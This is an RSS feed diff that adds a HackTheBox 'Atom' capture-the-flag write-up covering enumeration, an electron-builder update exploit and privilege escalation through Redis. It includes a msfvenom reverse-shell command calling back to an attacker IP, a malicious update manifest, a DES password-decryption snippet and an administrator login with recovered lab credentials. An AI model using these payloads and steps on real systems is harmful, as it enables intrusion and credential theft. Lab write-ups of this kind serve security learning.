@@ -5,12 +5,144 @@
     <link>https://mohamed-elleuch.me/tag/hackthebox/</link>
       <atom:link href="https://mohamed-elleuch.me/tag/hackthebox/index.xml" rel="self" type="application/rss+xml" />
     <description>HackTheBox</description>
-    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 26 Jun 2021 00:00:00 +0000</lastBuildDate>
+    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 10 Jul 2021 00:00:00 +0000</lastBuildDate>
     <image>
       <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png</url>
       <title>HackTheBox</title>
       <link>https://mohamed-elleuch.me/tag/hackthebox/</link>
     </image>
+    
+    <item>
+      <title>HackTheBox - Atom Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-atom/</link>
+      <pubDate>Sat, 10 Jul 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-atom/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV 10.10.10.237 -v
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Heed Solutions
+135/tcp open  msrpc        Microsoft Windows RPC
+443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Heed Solutions
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
+|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;p-stylecolorgreenweb-enumeration-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enumeration &lt;/p&gt;&lt;/h2&gt;
+&lt;img src=&#34;web.png&#34;&gt;
+&lt;p&gt;It&amp;rsquo;s a static page with an executeable to download, but nothing interesting! Let&amp;rsquo;s keep enumerating&lt;/p&gt;
+&lt;h2 id=&#34;p-stylecolorgreensmb-enumeration-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;SMB Enumeration &lt;/p&gt;&lt;/h2&gt;
+&lt;img src=&#34;smb.png&#34;&gt;
+&lt;p&gt;An interesting share &lt;code&gt;Software_Updates&lt;/code&gt; let&amp;rsquo;s take a look at it&lt;/p&gt;
+&lt;img src=&#34;foothold.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s try download everything&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;prompt off
+recurse on
+mget *
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;smbfiles.png&#34;&gt;
+We only have a pdf file!
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorred-foothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; Foothold &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;Let&amp;rsquo;s take a look at the pdf file&lt;/p&gt;
+&lt;img src=&#34;electron.png&#34;&gt;
+&lt;img src=&#34;electron1.png&#34;&gt;
+&lt;p&gt;The Heedv1 app is build with &lt;code&gt;electron-builder&lt;/code&gt; and also we can drop updates in the client folders in the smb and it get executed.
+Searching in  google for an electron builder update rce, we can find an interesting&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s first create our shell with the name &amp;ldquo;s&amp;rsquo;hell.exe&amp;rdquo; to bypass the signature&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp  lhost=10.10.14.5 lport=9001 -f exe -o &amp;quot;s&#39;hell.exe&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And also generate the encdoded shasum of our malicious file&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;shasum -a 512 s\&#39;hell.exe | cut -d &amp;quot; &amp;quot; -f1 | xxd -r -p | base64
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we&amp;rsquo;re ready to create our &lt;code&gt;latest.yml&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-yml&#34;&gt;version: 1.2.3
+
+path: http:/IP:PORT/s&#39;hell.exe
+sha512: CZsOB2[-SNIP-]2tW5UhzwqzLVkkpzAbuIw==
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s setup a listener and upload them to the clients folder in the smb! And wait until we get a shell back&lt;/p&gt;
+&lt;img src=&#34;foothold.png&#34;&gt;
+&lt;p&gt;We&amp;rsquo;re on the box now! And we can get the user flag !:D&lt;/p&gt;
+&lt;img src=&#34;user.png&#34;&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorred-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; PrivEsc &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;Before running any enumerating tool, i always check the Program file folders to check if we have any Software  (a aka free win) installed in the system!&lt;/p&gt;
+&lt;img src=&#34;portable.png&#34;&gt;
+&lt;p&gt;We  can copy the whole file and try to retrieve the encrypted like the machine &lt;code&gt;sharp&lt;/code&gt; but let&amp;rsquo;s keep enumerating!&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/49409&#34;&gt;https://www.exploit-db.com/exploits/49409&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;redis.png&#34;&gt;
+&lt;p&gt;We can see that Redis is installed, we can grab the redis password from the config file&lt;/p&gt;
+&lt;img src=&#34;pass.png&#34;&gt;
+&lt;pre&gt;&lt;code&gt;requirepass kidvscat_yes_kidvscat
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we can enumerate the redis service!&lt;/p&gt;
+&lt;p&gt;We will use the redis-tools package&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo apt-get install redis-tools
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A very good ressource, i&amp;rsquo;ll use everything from here &lt;a href=&#34;https://book.hacktricks.xyz/pentesting/6379-pentesting-redis&#34;&gt;https://book.hacktricks.xyz/pentesting/6379-pentesting-redis&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Let&amp;rsquo;s dump the database&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;info
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;rd.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s list the keys from the db0&lt;/p&gt;
+&lt;img src=&#34;rd1.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s check their content
+&lt;img src=&#34;PS.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The key &lt;code&gt;pk⚱user:e8e29158-d70d-44b1-a1ba-4949d52790a0&lt;/code&gt; seems to give us credentials&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Administrator:Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seems like it&amp;rsquo;s an encrypted password! And we already know that we have an exploit to decrypt it ! Lets give it a try&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s just take a snippet from the exploit-db exploit&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python3
+import base64
+from des import *
+def decode(hash):
+	hash = base64.b64decode(hash.encode(&#39;utf-8&#39;))
+	key = DesKey(b&amp;quot;7ly6UznJ&amp;quot;)
+	return key.decrypt(hash,initial=b&amp;quot;XuVUm5fR&amp;quot;,padding=True).decode(&#39;utf-8&#39;)
+
+print(&#39;[+] Decrypted Password: &#39;+decode(&#39;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#39;))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;adminpass.png&#34;&gt;
+&lt;pre&gt;&lt;code&gt;Administrator:kidvscat_admin_@123
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now let&amp;rsquo;s login as administrator to the machine&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;winexe -U &#39;Administrator%kidvscat_admin_@123&#39; //10.10.10.237 cmd.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;toor.png&#34;&gt;
+&lt;p&gt;And we rooted the machine!&lt;/p&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
     
     <item>
       <title>HackTheBox - Spectra Writeup</title>
